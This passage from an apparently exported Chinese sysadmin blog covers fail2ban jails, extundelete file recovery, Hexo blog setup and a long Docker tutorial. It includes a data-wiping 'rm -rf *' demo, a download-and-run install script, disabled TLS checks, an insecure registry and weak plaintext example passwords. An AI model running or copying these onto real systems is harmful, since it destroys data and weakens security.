删除某个监控（监狱）可以忽略的ipset banip 将ip加入 监控（监狱）set unbanip 将ip从监控（监狱）移除 还有很多没有列出来，我只在列出了我常用的一些。 3.3 fail2ban-regex 测试筛选规则设否匹配当前的日志格式： fail2ban-regex /var/log/secure /etc/fail2ban/filter.d/sshd.conf fail2ban邮件预警fail2ban 利用sendmail 进行发邮件也可以用mail进行发邮件，在尝试了sendmail无果后，决定使用mail。 具体步骤： 4.1 在/etc/mail.rc末尾配置发件人的信息： set ssl-verify=ignoreset from=djxset smtp=smtps://mail.163.com:25set smtp-auth-user=djset smtp-auth-password=set smtp-auth=loginset nss-config-dir=/root/.certs 4.2 然后在jail.local(自己的配置文件里)，加入： mail-whois[name=SSH, dest=1120@qq.com, sender=djx@163.com] dest 是填入收件人邮箱 sender 是填入 发送邮箱 最后重新加载下配置即可。 注意的问题： 时区问题： http://www.fail2ban.org/wiki/index.php/FAQ_english：If time reference is not the same everywhere, then fail2ban won’t ban any IP! 当我们更改了时区后，然后日志的时间并没有修改过来，导致两者的时间不一致，这样fail2ban的工作就失效了 解决办法：重启日志服务：systemctl restart rsyslog，保证两者的时间一致。 修改端口问题: sshd更改端口号后使用fail2ban需要注意在填写配置的时候也需要更改端口号。否则会出现就算会将ip添加到防火墙，但是由于我更改了端口号，是起不到禁止作用的。 解决方法：配置文件中 action = iptables[name=SSH, port=ssh, protocol=tcp] ,port位置修改为新的端口。 shell &gt; cat /var/log/secure ##系统登陆日志 Jun 5 17:39:01 localhost sshd[1341]: Failed password for root from 192.168.214.1 port 2444 ssh2Jun 5 17:39:06 localhost sshd[1341]: Failed password for root from 192.168.214.1 port 2444 ssh2Jun 5 17:39:11 localhost sshd[1341]: Failed password for root from 192.168.214.1 port 2444 ssh2Jun 5 17:39:14 localhost sshd[1341]: Failed password for root from 192.168.214.1 port 2444 ssh2Jun 5 17:39:18 localhost sshd[1341]: Failed password for root from 192.168.214.1 port 2444 ssh2Jun 5 17:41:39 localhost login:pam_unix(login:session): session opened for user root by LOGIN(uid=0) 6、加入 Nginx 防护（ httpd 代替 ）##目的是把规定时间内达到限定访问次数的 IP 封锁（例如，一分钟内有几百次请求）shell &gt; vim /etc/fail2ban/jail.conf 12345678910[nginx] ## nginx防护enabled = truefilter = nginx ##访问规则定义文件，位置在 /etc/fail2ban/filter.d/nginx.confaction = iptables[name=nginx, port=http, protocol=tcp]sendmail-whois[name=nginx,dest=1355*******@139.com,sender=fail2ban@aoath.com, sendername=&quot;Fail2Ban&quot;]logpath = /var/log/nginx/access_log ## nginx访问日志bantime = 86400 ##符合规则的屏蔽一天，如果参数值与全局有冲突，优先级大于全局配置findtime = 600 ## 10分钟内访问超过 maxretry 次数的封锁 IPmaxretry = 1000 ##最大尝试次数 在etc/fail2ban/filter.d目录下新增nginx.conf文件并追加以下内容： 12345 vim /etc/fail2ban/filter.d/nginx.conf [Definition]failregex = &lt;HOST&gt; -.*- .*HTTP/1.* 404 .*$ignoreregex =--------------------- 1234vim /etc/fail2ban/filter.d/nginx.conf[Definition]failregex =.*-.*-.*$ ## 表示访问 IP ，其余的其实是最简单匹配了。因为这里没有要匹配精确的 URL ，只是限制访问次数ignoreregex = shell &gt; fail2ban-regex /var/log/nginx/access_log /etc/fail2ban/filter.d/nginx.conf ##可以测试条件规则是否可用重启失败就手动创建access_log文件touch /var/log/nginx/access_logshell &gt; service fail2ban restart ##重启服务shell &gt; fail2ban-client status ##可以看到有两个实例在监控中Status|- Number of jail: 2- Jail list: nginx, ssh-iptables ##开始测试，通过脚本或者不管刷新页面测试 Nginx 防护（ 便于测试，可以将 maxretry 的值调为 10 ） shell &gt; fail2ban-client status nginx ##可以看到被 Ban 掉的 IP Status for the jail: nginx |- filter | |- File list: /var/log/httpd/access_log | |- Currently failed: 1 | - Total failed: 39` action|- Currently banned: 1| - IP list: 192.168.214.1 - Total banned: 1 7、需要安装python,iptables,tcp-wrapper,shorewall,Gamin。如果想要发邮件，那必需安装postfix或sendmail Linux下使用extundelete实现文件/文件夹数据恢复注意事项 恢复文件的时候一定要卸载磁盘分区1.首先关闭防火墙和SELINUX 2.在虚拟机上创建一个2G的磁盘 fdisk /dev/sdbn+p+1+回车+回车+w4.使分区无需重启就能生效 partx -a /dev/sdb5.格式化为ext4分区并挂载 mkfs.ext4 /dev/sdb1 mkdir /data mount /dev/sdb1 /data注: 在实际线上恢复过程中，切勿将extundelete安装到你误删的文件所在硬盘，这样会有一定几率将需要恢复的数据彻底覆盖。建议加装一块硬盘将extundelete安装到此硬盘，再做以下操作。二.extundelete安装2.下载并安装extundelete 12345 wget http://nchc.dl.sourceforge.net/project/extundelete/extundelete/0.2.4/extundelete-0.2.4.tar.bz2# tar -jxvf extundelete-0.2.4.tar.bz2# cd extundelete-0.2.4# ./configure --prefix=/usr/local/extundelete# make &amp;&amp; make install 3.验证是否安装成功 cd /usr/local/extundelete/bin ./extundelete -v 4.设置环境变量 echo “PATH=/usr/local/extundelete/bin:$PATH” &gt;&gt; /etc/profile echo “export PATH” &gt;&gt; /etc/profile source /etc/profile 5.上传一些图片，安装包等文件到/data目录 cd /data yum install lrzsz -y rz 本地文件….. lslost+found mysql-5.6.10.tar.gz nginx.conf pic.jpg 6.全部删除 rm -rf * 7.查看被删除文件1).查看前需卸载该磁盘分区 cd ~ umount /dev/sdb1 2).查看文件注:一般一个分区挂载到一个目录下时，这个”根”目录的inode值为2我们为了查看根目录所有文件，所以查看分区inode为2的这个部分# extundelete /dev/sdb1 –inode 2——————————–….. File name | Inode number | Deleted status. 2.. 2lost+found 11 Deletedmysql-5.6.10.tar.gz 12 Deletednginx.conf 13 Deleted pic.jpg 14 Deleted 注:标记为”Deleted”的文件则是被删除的文件 8.恢复指定的文件注: 默认被删文件会恢复到当前目录下的RECOVERED_FILES目录中去 extundelete –restore-file pic.jpg /dev/sdb1 cd RECOVERED_FILES/ ll -rw-r–r– 1 root root 52592 8月 13 07:18 pic.jpg 9.完全恢复设备上文件 extundelete –restore-all /dev/sdb1 ll 总用量34464-rw-r–r– 1 root root 35174149 8月 13 07:24 mysql-5.6.10.tar.gz-rw-r–r– 1 root root 4551 8月 13 07:24 nginx.conf-rw-r–r– 1 root root 52592 8月 13 07:18 pic.jpg -rw-r–r– 1 root root 52592 8月 13 07:24 pic.jpg.v1 注:这里完全恢复并不会把之前恢复的pic.jpg文件覆盖掉，而是重命名为pic.jpg.v1 10.恢复指定的时间点后被删文件1).指定一个时间点 date -d “Sep 4 03:09:13 2013” +%s 1378235353 2).恢复这个时间点后的文件 extundelete –restore-all –after “1378235353” /dev/sdb1 注:如果要恢之前的就用before参数。extundelete命令与after结合使用，在进行恢复时非常有用，可以过滤掉那太旧的文件，减小恢复压力。 11.检验是否恢复成功 md5sum RECOVERED_FILES/mysql-5.6.10.tar.gz 9dcee911fb4bc7e977a6b63f4d3ffa63 RECOVERED_FILES/mysql-5.6.10.tar.gz 上传刚才误删的mysql安装包 rz md5sum mysql-5.6.10.tar.gz 9dcee911fb4bc7e977a6b63f4d3ffa63 mysql-5.6.10.tar.gz MD5值相同，恢复成功。。。","link":"/2020/08/04/fail2ban/"},{"title":"github Hexo搭建个人博客","text":"github Hexo搭建个人博客准备环境准备node和git环境 安装node 123456789101112131415https://nodejs.orgwget https://nodejs.org/dist/v12.14.0/node-v12.14.0-linux-x64.tar.xztar -xvf node-v12.14.0-linux-x64.tar.xz -C /usr/local/ #解压tarcd /usr/local/mv node-v12.14.0-linux-x64/ node配置环境变量vim /root/.bash_profilePATH=$PATH:$HOME/bin:/usr/local/node/bin#使环境变量生效source /root/.bash_profile 查看环境是否安装好 12345678node -vv12.14.0npm -v6.13.4git versiongit version 1.8.3.1 安装Hexo如果以上环境准备好了就可以使用 npm 开始安装 Hexo 了。也可查看 https://hexo.io/zh-cn/ 的详细文档。 1npm install -g hexo-cli 安装 Hexo 完成后，再执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。 123hexo init myBlogcd myBlognpm install 新建完成后，指定文件夹的目录如下: 1234567_config.yml #网站的配置信息，你可以在此配置大部分的参数。package.jsonscaffolds #模板文件夹source #资源文件夹，除_posts 文件，其他以下划线_开头的文件或文件夹不会被编译打包到public文件夹。 _drafts #草稿文件 _posts #文章markdown文件themes #主题文件夹。 如果上面的命令都没有报错的话，就可以运行hexo s 命令 ，在浏览器输入ip:4000就可以访问看效果了 1234hexo g #生成hexo s #部署到本地，看看效果hexo g -d #部署到远程github init1$ hexo init [folder] 新建一个网站。如果没有设置 folder ，Hexo 默认在目前的文件夹建立网站。 new1$ hexo new [layout] &lt;title&gt; 新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。 1$ hexo new &quot;linux基础&quot; 参数 描述 -p, --path 自定义新文章的路径 -r, --replace 如果存在同名文章，将其替换 -s, --slug 文章的 Slug，作为新文章的文件名和发布后的 URL 默认情况下，Hexo 会使用文章的标题来决定文章文件的路径。对于独立页面来说，Hexo 会创建一个以标题为名字的目录，并在目录中放置一个 index.md 文件。你可以使用 --path 参数来覆盖上述行为、自行决定文件的目录： 1hexo new page --path about/me &quot;About me&quot; 以上命令会创建一个 source/about/me.md 文件，同时 Front Matter 中的 title 为 &quot;About me&quot; 注意！title 是必须指定的！如果你这么做并不能达到你的目的： 1hexo new page --path about/me 此时 Hexo 会创建 source/_posts/about/me.md，同时 me.md 的 Front Matter 中的 title 为 &quot;page&quot;。这是因为在上述命令中，hexo-cli 将 page 视为指定文章的标题、并采用默认的 layout。 generate1$ hexo generate 生成静态文件。 选项 描述 -d, --deploy 文件生成后立即部署网站 -w, --watch 监视文件变动 -b, --bail 生成过程中如果发生任何未处理的异常则抛出异常 -f, --force 强制重新生成文件 Hexo 引入了差分机制，如果 public 目录存在，那么 hexo g 只会重新生成改动的文件。 使用该参数的效果接近 hexo clean &amp;&amp; hexo generate -c, --concurrency 最大同时生成文件的数量，默认无限制 修改后直接部署的命令 1hexo g -f -d 以下是预先定义的参数，您可在模板中使用这些参数值并加以利用。 参数 描述 默认值 layout 布局 title 标题 文章的文件名 date 建立日期 文件建立日期 updated 更新日期 文件更新日期 comments 开启文章的评论功能 true tags 标签（不适用于分页） categories 分类（不适用于分页） permalink 覆盖文章网址 分类和标签只有文章支持分类和标签，您可以在 Front-matter 中设置。在其他系统中，分类和标签听起来很接近，但是在 Hexo 中两者有着明显的差别：分类具有顺序性和层次性，也就是说 Foo, Bar 不等于 Bar, Foo；而标签没有顺序和层次。 12345categories:- Diarytags:- PS3- Games 分类方法的分歧 如果您有过使用 WordPress 的经验，就很容易误解 Hexo 的分类方式。WordPress 支持对一篇文章设置多个分类，而且这些分类可以是同级的，也可以是父子分类。但是 Hexo 不支持指定多个同级分类。下面的指定方法： 123categories: - Diary - Life 会使分类Life成为Diary的子分类，而不是并列分类。因此，有必要为您的文章选择尽可能准确的分类。 如果你需要为文章添加多个分类，可以尝试以下 list 中的方法。 1234categories:- [Diary, PlayStation]- [Diary, Games]- [Life] 此时这篇文章同时包括三个分类： PlayStation 和 Games 分别都是父分类 Diary 的子分类，同时 Life 是一个没有子分类的分类。 完整教程参考文章1https://segmentfault.com/a/1190000017986794 更换主题123456789101112比较不错的主题。https://github.com/removeif/hexo-theme-amazing需要安装模块和指定版本。npm install ajv npm install bulma-stylus@0.8.0npm install hexo@4.2.0npm install hexo-log@1.0.0npm install hexo-renderer-infernonpm install hexo-util@^1.8.0npm install infernonpm install inferno-create-element 置顶设置：.md文章头部数据中加入top值，top值越大越靠前，大于0显示置顶图标。 修改依赖包中文件removeif/node_modules/hexo-generator-index/lib/generator.js如下： 12345678910111213141516171819202122232425262728'use strict';const pagination = require('hexo-pagination');module.exports = function(locals){ var config = this.config; var posts = locals.posts; posts.data = posts.data.sort(function(a, b) { if(a.top == undefined){ a.top = 0; } if(b.top == undefined){ b.top = 0; } if(a.top == b.top){ return b.date - a.date; }else{ return b.top - a.top; } }); var paginationDir = config.pagination_dir || 'page'; return pagination('', posts, { perPage: config.index_generator.per_page, layout: ['index', 'archive'], format: paginationDir + '/%d/', data: { __index: true } });}; 配置文章中推荐文章模块根据配置的recommend值（必须大于0），值越大越靠前，相等取最新的，最多取5条。recommend（6.中top值也在下面示例）配置在.md文章头中，如下 123456789title: 博客源码分享top: 1toc: truerecommend: 1 keywords: categories-githubdate: 2019-09-19 22:10:43thumbnail: https://cdn.jsdelivr.net/gh/removeif/blog_image/img/2019/20190919221611.pngtags: 工具教程categories: [工具教程,主题工具] 文章中某个代码块折叠的方法代码块头部加入标记 &gt;folded，如下代码块中使用。 123456789// 使用示例，.md 文件中头行标记&quot;&gt;folded&quot;// ```java main.java &gt;folded// import main.java// private static void main(){// // test// int i = 0;// return i;// }// \\\\``` 加入加密文章12345https://github.com/MikeCoder/hexo-blog-encrypt/blob/master/ReadMe.zh.md官方教程安装插件npm install --save hexo-blog-encrypt 如下需要加密的文章 头部加入以下代码 123456789101112131415---title: python之Selenium模块的使用top: -1toc: truedate: 2020-08-04 17:10:43tags: pythoncategories: pythonkeywords: categories-javaencrypt: truepassword: 123456 #此处为文章密码abstract: 咦，这是一篇加密文章，好像需要输入密码才能查看呢！message: 嗨，请准确无误地输入密码查看哟！wrong_pass_message: 不好意思，密码没对哦，在检查检查呢！wrong_hash_message: 不好意思，信息无法验证！--- 注：加密文章不会出现在最新文章列表widget中，也不会出现在文章中推荐列表中，首页列表中需要设置top: -1 让它排在最后比较合理一些。","link":"/2020/08/02/github-Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"title":"docker的使用","text":"一，docker介绍使用 1.Docker 安装windos安装 12直接官网下载就可以了https://download.docker.com/win/stable/Docker%20Desktop%20Installer.exe Docker支持以下的CentOS版本： CentOS 7 (64-bit) CentOS 6.5 (64-bit) 或更高的版本前提条件目前，CentOS 仅发行版本中的内核支持 Docker。Docker 运行在 CentOS 7 上，要求系统为64位、系统内核版本为 3.10 以上。Docker 运行在 CentOS-6.5 或更高的版本的 CentOS 上，要求系统为64位、系统内核版本为 2.6.32-431 或者更高版本。 1.使用 yum 安装（CentOS 7下）Docker 要求 CentOS 系统的内核版本高于 3.10 ，查看本页面的前提条件来验证你的CentOS 版本是否支持 Docker 。通过 uname -r 命令查看你当前的内核版本 1[root@server1 ~]# uname -r 从 2017 年 3 月开始 docker 在原来的基础上分为两个分支版本: Docker CE 和 Docker EE。Docker CE 即社区免费版，Docker EE 即企业版，强调安全，但需付费使用。本文介绍 Docker CE 的安装使用。 docker的官方文档安装 1https://docs.docker.com/engine/install/centos/ 移除旧的版本： 12345678910sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-selinux \\ docker-engine-selinux \\ docker-engine 安装一些必要的系统依赖工具： 1yum install -y yum-utils device-mapper-persistent-data lvm2 添加软件源信息 123456789阿里云的软件源:yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repowget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo官方的下载源:sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo 更新 yum 缓存 1yum makecache fast 列出Docker软件版本信息 1yum list docker-ce --showduplicates | sort -r 安装 Docker-ce 123yum -y install docker-ce //默认安装最新版本yum -y install docker-ce-3:18.09.7-3.el7 //安装指定版本 支持端口转发 12echo &quot;net.ipv4.ip_forward = 1&quot; &gt;&gt; /etc/sysctl.conf sysctl -p 重新加载systemctl配置 123如果修改了systemctl edit docker.service 这个文件，就要执行这步操作 systemctl daemon-reload 启动 Docker 后台服务 123systemctl start dockersystemctl status dockersystemctl enable docker 1.1docker疑难杂症：docker命令Tab无法自动补全1.安装bash-complete 1yum install -y bash-completion 2.刷新文件 12source /usr/share/bash-completion/completions/dockersource /usr/share/bash-completion/bash_completion 查看版本信息 12docker versiondocker info 测试Docker安装 通过运行hello-world Docker映像来测试安装是否正常： 1$ docker run hello-world 2.使用脚本安装 Docker1、使用 sudo 或 root 权限登录 Centos。 2、确保 yum 包更新到最新 1sudo yum update 3、执行 Docker 安装脚本。 123curl -fsSL https://get.docker.com -o get-docker.shsudo sh get-docker.sh 执行这个脚本会添加 docker.repo 源并安装 Docker 4、启动 Docker 进程。 123systemctl start dockersystemctl status dockersystemctl enable docker 5、查看版本信息 12docker versiondocker info 3,删除卸载Docker CE执行以下命令来删除 Docker CE： 12sudo yum remove docker-ce docker-ce-cli containerd.io -ysudo rm -rf /var/lib/docker 2.Docker的使用1.docker常用命令1.镜像仓库123456781.搜索镜像docker search centos 2. 从镜像参数中拉取指定镜像docker pull centos docker官方镜像库https://hub.docker.com/ 2.镜像相关命令1234567891011121314151617181920212223242526272829301.列出本地镜像docker imagesdocker images -adocker image ls2.删除镜像docker rmi 镜像名docker rmi -f 镜像名 //强制删除镜像3.查到指定镜像的创建历史docker history 镜像名4.将指定镜像保存为tar归档文件 -o 输出指定文件docker save -o hello.tar hello-world //hello-world为镜像名。 hello.tar为指定输出的文件5.由tar文档生成镜像docker import -m &quot;有本地保存的tar文件生成&quot; ./hello.tar hello-world参数说明: -m 为创建的镜像设置描述信息，可以通过docker history -H 查看。 ./hello.tar 为tar文件的路径， hello-world 为镜像名字6.使用dockerfile创建镜像 docker build [可选选项] 文件路径 . 当前目录 docker build -t look/centos7.3 . 参数说明： -t ：指定要创建的目标镜像名 . ：Dockerfile 文件所在目录，可以指定Dockerfile 的绝对路径 7. 创建某个镜像的副本 docker tag src_image[:tag] tar_image[:tag] docker tag centos:latest localhost:5000/centos #把本地的centos镜像复制一份，命名为localhost:5000/centos 3.容器操作常见命令12345678910111213141516171819202122232425262728293031323334353637383940411.docker ps 列出容器 docker ps -a -a 只显示正在运行的2.docker inspect 7019f9fdf8ab 查看容器或镜像的元数据3.docker top 容器名 查看指定容器中运行的进程4.docker exec -it 容器名 /bin/bash //进入容器5.docker logs -f 容器名 #查看容器的实时日志6.docker cp // 容器与主机之间的文件复制 从容器中复制到主机 docker cp testtomcat:/usr/local/tomcat/webapps/test/js/test.js /opt 从主机复制到容器中 docker cp /opt/test.js testtomcat:/usr/local/tomcat/webapps/test/js 选项: -a 复制所有的gid/uid信息 -L Always follow symbol link in SRC_PATH 始终遵循原路径的符号信息7.docker difff CONTAINER // 查看容器中被修改过的文件或目录8.启动停止重启容器docker stop hello-worlddocker start hello-worlddocker restart hello-worlddocker kill hello-world #杀死一个容器9.查看所有容器id docker ps -aq10.删除所有容器 docker rm $(docker ps -aq)11.查看所有没有运行的容器id docker ps -f &quot;status=exited&quot; -q 12. 删除所有没有运行的容器 docker rm $(docker ps -f &quot;status=exited&quot; -q) 4.运行容器123456789101112131415运行容器docker run --name 容器名 -d -p 3306:3306 mysql docker 启动容器docker run image_namedocker run -d -p 80:80 nginx:latestrun（创建并运行一个容器） -d 放在后台 -p 端口映射 :docker的容器端口-P 随机分配端口-v 源地址(宿主机):目标地址(容器)docker run -it --name centos6 centos:6.9 /bin/bash -it 分配交互式的终端 --name 指定容器的名字 /bin/sh覆盖容器的初始命令 2,构建Dockerfile编写一个go程序hello.go 12345678package mainimport &quot;fmt&quot;func main(){fmt.Println(&quot;hello world&quot;)} 创建一个文件Dockerfile命名 123456789#从头开始FROM scratch#加到根目录ADD hello /#运行helloCMD [&quot;/hello&quot;] 开始构建 1docker build -t gohallo/hello . 把go程序跑起来 1docker run gohello/hello 下载一个centos镜像并跑起来 12345678docker run centos docker run -it --name centosl -d centos 拷贝hello文件到容器docker cp hello centosl:/usr/local/进入容器docker exec -it centosl /bin/bash 2.1Dockerfile 详解1.FROM 1234文件的开始FROM scratch #从头开始制作一个最简单的FROM centos #使用centos 为系统，本地若没有则拉取FROM centos:7.0 #指定系统+ 版本号 2.LABEL 123LABEL：相当于注释，或者说明信息。LABEL version=&quot;1.0&quot;LABEL author=&quot;luke&quot; 3.RUN 12345RUN :相当于执行命令，每执行一条RUN,就会多一层RUN yum -y update &amp;&amp; yum install -y lrzsz \\ net-tools \\相当于连接线，如果一行写不完就可以这样做。 4.WORKDIR 12345WORKDIR 进入或创建目录WORKDIR /root 进入/root目录WORKDIR /test 自动创建目录WORKDIR demoRUN pwd # /test/demo 会打印这个路径 5.ADD and COPY 123456ADD and COPY 将本地文件添加到镜像里ADD 可以解压文件ADD hello / 将主机当前的hello文件 添加到 容器的/根目录下ADD XXX.tar.gz / 添加到根目录，并解压文件COPY hello / 直接复制一份到/目录下 6.ENV 12345678功能为设置环境变量 ENV MYSQL_VERSION 5.6 #设置常量RUN yum install -y mysql-server=&quot;$(MYSQL_VERSION)&quot; 等于下载mysql 5.6版本的或者设置了后，后续的 RUN 命令都可以使用，container 启动后，可以通过 docker inspect 查看这个环境变量，也可以通过在 docker run --env key=value 时设置或修改环境变量。 假如你安装了 JAVA 程序，需要设置 JAVA_HOME，那么可以在 Dockerfile 中这样写： ENV JAVA_HOME /usr/local/jdkxxxx/ 7.EXPOSE 1234567891011121314151617181920212223EXPOSE 用于指定容器在运行时监听的端口： EXPOSE &lt;port&gt; [&lt;port&gt;...] EXPOSE 并不会让容器的端口访问到主机。要使其可访问，需要在 docker run 运行容器时通过-p来发布这些端口，或通过-P 参数来发布 EXPOSE 导出的所有端口。 映射一个端口 EXPOSE port1 # 相应的运行容器使用的命令 docker run -p port1 image # 映射多个端口 EXPOSE port1 port2 port3 # 相应的运行容器使用的命令 docker run -p port1 -p port2 -p port3 image # 还可以指定需要映射到宿主机器上的某个端口号 docker run -p host_port1:port1 -p host_port2:port2 -p host_port3:port3 image 端口映射是 docker 比较重要的一个功能，原因在于我们每次运行容器的时候容器的 IP 地址不能指定而是在桥接网卡的地址范围内随机生成的。 宿主机器的 IP 地址是固定的，我们可以将容器的端口的映射到宿主机器上的一个端口，免去每次访问容器中的某个服务时都要查看容器的 IP 的地址。 对于一个运行的容器，可以使用 docker port 加上容器中需要映射的端口和容器的 ID 来查看该端口号在宿主机器上的映射端口 8.CMD and ENTRYPOINT 123456789101112131415 #shell格式RUN yum install -y lrzsz CMD echo &quot;hello docker &quot;ENTRYPONINT echo &quot;hello docker&quot;#exec 格式RUN [&quot;yum&quot;,&quot;-y&quot;,&quot;install&quot;,&quot;lrzsz&quot;]CMD [&quot;/bin/echo&quot;,&quot;hello Docker&quot;]ENTRYPONINT [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;echo hello Docker&quot;]CMD 和ENTRYPOINT的区别CMD 若docker指定了其他命令，CMD 会被忽略 若定义了多个CMD，只会执行最后一个 9.VOLUME 1VOLUME [&quot;/var/www/html&quot;,&quot;/data/mysql/data&quot;] 3,搭建私有镜像仓库1.直接执行一条命令搭建 123456官网地址: https://hub.docker.com/_/registrydocker run -d -p 5000:5000 --restart always --name registry registry:2或者docker run -d -p 5000:5000 --restart always --name registry -v /opt/reqistry:/var/lib/registry registry:2/var/lib/registry是容器存放镜像的目录 2.构建自己的镜像 1234docker build -t 192.168.224.11:5000/centos2 .或者复制一份本地的镜像docker tag centos:latest localhost:5000/centos 3.上传到自己搭建的镜像仓库 123456789101112 docker push 192.168.224.11:5000/centos2 The push refers to repository [192.168.224.11:5000/centos2]Get https://192.168.224.11:5000/v2/: http: server gave HTTP response to HTTPS client如果报错:echo '{ &quot;insecure-registries&quot;:[&quot;192.168.224.11:5000&quot;] }' &gt; /etc/docker/daemon.json重启dockerdocker push localhost:5000/centos去仓库看看。http://192.168.224.11:5000/v2/_catalog 4.在本地删除构建的镜像 123docker rmi 192.168.224.11:5000/centos2:latestdocker rmi localhost:5000/centos:latest 5.然后在去搭建的私有创库去下载镜像 1234docker pull 192.168.224.11:5000/centos2docker pull localhost:5000/centos也是很快就下载下来了 6.本地仓库加安全认证 12345678910111213141516171.生成密码:yum install -y httpd-tools mkdir /opt/registry-auth/ -phtpasswd -Bbn luke 123 &gt; /opt/registry-auth/htpasswd多用户就追加htpasswd -Bbn luke1 123 &gt;&gt; /opt/registry-auth/htpasswd2.重新启动带有秘钥功能的registry容器docker run -d -p 5000:5000 --restart always --name registry -v /opt/registry-auth/:/auth/ -v /opt/reqistry:/var/lib/registry -e &quot;REGISTRY_AUTH=htpasswd&quot; -e &quot;REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm&quot; -e &quot;REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd&quot; registry:23.push镜像，需要进行logindocker login 192.168.224.11:5000docker push 192.168.224.11:5000/centos2上传成功docker logout 192.168.224.11:5000退出登录 7.docker-habor实现图形化镜像仓库 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960611.安装docker-composeyum install -y docker-compose2.下载harbor离线安装包并解压wget https://storage.googleapis.com/harbor-releases/release-1.7.0/harbor-offline-installer-v1.7.1.tgz#解压harbor安装包:tar xvf harbor-offline-installer-v1.7.1.tgz3.修改harbor.cfg配置文件3.1 修改如下参数vim harbor/harbor.cfghostname = 192.168.224.11barbor_admin_password = luke123执行install.sh3.2.修改docker配置文件vim /etc/docker/daemon.json#增加如下参数[&quot;192.168.224.11&quot;]&quot;live-restore&quot;:true3.3重启dockersystemctl restart docker4.测试harbor仓库4.1 建立harbor项目通过web访问harbor仓库http://192.168.224.11/输入用户名和密码：默认用户admin密码：luke123 #修改harbor.cfg时设置的密码4.2建立项目，命名luke 设置公有4.3 给镜像打标签docker tag centos:latest 192.168.224.11/luke/centos_habor:v14.4 登录仓库[root@instance-x0nj9foj harbor]# docker login 192.168.224.11Username: adminPassword: luke123Login Succeeded4.5 上传镜像文件docker push 192.168.224.11/luke/centos_habor:v14.6 web登录镜像仓库进行确认 4.Docker的网络1.网络的分类单机 12345Bridge Network 桥接网络Host Network 公用主机网络和宿主机一个网络None Network 本地网络，自己和自己玩 多机 12Overlay Network 做集群的时候用。 2.Linux 网络命名空间namespace命名空间是docker底层重要的概念 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455列出网络名ip netns list 增加一个网络名ip netns add test1删除一个网络ip netns delete test1 查看新建的网络的状态 刚开始是DOWNip netns exec test1 ip a 设置test1网络的状态，现在变成了UNKNOWNip netns exec test1 ip link set dev lo up 命名空间至少需要两个以上才能连接起来在添加一个ip netns add test2 添加veth peer veth 对ip link add veth-test1 type veth peer name veth-test2查看veth对ip link 把veth-test1 加入到 test1网络ip link set veth-test1 netns test1 查看test1的link状态.ip netns exec test1 ip link 把veth-test2加入到test2网络 ip link set veth-test2 netns test2给test1网络添加ipip netns exec test1 ip addr add 172.17.0.2/24 dev veth-test1 给test2网络添加ipip netns exec test2 ip addr add 172.17.0.3/24 dev veth-test2在查看状态test1命名空间的ip netns exec test1 ip link启动test1,指定veth对ip netns exec test1 ip link set dev veth-test1 up 启动test2,指定veth对ip netns exec test2 ip link set dev veth-test2 up 查看test1网络的IPip netns exec test1 ip a test1网络去ping test2的ipip netns exec test1 ping 172.17.0.3 test2网络去ping test1的ipip netns exec test2 ping 172.17.0.2 3.Bridge 详解进行多容器通信 12345678910111213141516查看支持的网络docker network ls查看网络id的数据信息docker network inspect 6343c0e76790查看registry容器的网络信息docker exec registry ip aeth0@if26 用ip a命令查看 26: vetha30904a@if25: 这个if25和if26就是veth对yum install -y bridge-utils 下载这个工具brctl show 查看桥接网络和容器的veth对 brctl showbridge name bridge id STP enabled interfacesdocker0 8000.02423025af29 no veth33d7deb vetha30904a 4.容器通信有时写代码时，并不知道要请求的IP地址 1. –link &lt;name or id&gt;:alias 其中，name和id是源容器的name和id，alias是源容器在link下的别名。 123456789101112131415161.启动一个容器命名为mycentos2docker run -it --name mycentos2 --restart=always -d centos2.再启动一个容器mycentos3 --link 链接到mycentos2docker run -it --name mycentos3 --restart=always --link mycentos2 -d centos这时候进去mycentos3里面，docker exec -it mycentos3 /bin/bash就可以直接ping mycentos2 可以直接ping通了。不用输入ip地址，但是进去mycentos2里面不能通过容器名ping通mycentos3这个容器，只能ip才可以ping3.在启动一个容器，进行多个容器链接。docker run -it --name mycentos4 --restart=always --link mycentos2:centos2 --link mycentos3:centos3 -d centos进入容器 docker exec -it mycentos4 /bin/bashping mycentos2 或者ping centos2ping mycentos3 或者ping centos3 都可以ping通 2.创建网络(推荐)1234567891011121314151617181920212223242526272829docker network ls创建网络docker network create -d bridge my-bridge-d 后面第一个bridge是网络的连接方式，第二个my-bridge是自己起的网络的名字如何创建镜像同时连上主容器的某个网络上？在镜像创建时指定network 的name ,可以通过docker network ls查看到所有的网络，如下面实例docker run -it --name test1 --restart=always --network my-bridge -d centos如何查看是否连上了呢?docker network inspect+ 网络的名字 my-bridge如何手动将网络和容器连接呢？docker network connect my-bridage mycentos4docker network connect my-bridge mycentos3docker network connect my-bridge mycentos2这时候进去test1 就可以ping mycentos4了。同时mycentos4里面也可以通过ping test1来ping通docker exec -it test1 /bin/bash这时他们几个容器都可以互相ping通通过将test2和test3同时连上自己的创建的网络（注意是自己创建的网络，不是系统自己默认的网络）,这样双方都可以通过名字互ping上 5.端口映射实现外界访问 12345678910111213141516171. -p 8080:80 把容器的80端口映射到主机的8080端口docker run -it --name web --restart=always -p 8080:80 --network my-bridge -d nginx这时候访问主机的8080端口就可以访问内部的80端口了。http://192.168.224.11:8080/2. -p ip:8081:80 把容器的80端口映射到主机指定的ip端口docker run -it --name nginx2 --restart=always -p 192.168.224.11:8081:80 --network my-bridge -d nginx这样就只能通过指定ip:端口才可以访问了，3.随机端口映射(32768-60999)-p 80 把容器的80端口映射到主机的随机端口docker run -it --name web2 --restart=always -p 80 --network my-bridge -d nginx4. udp端口映射 把容器的udp端口映射到主机端口-p 82:53/udp 5. 多个端口映射 -p 8080:80 -p 33060:3306 -p 2222:22 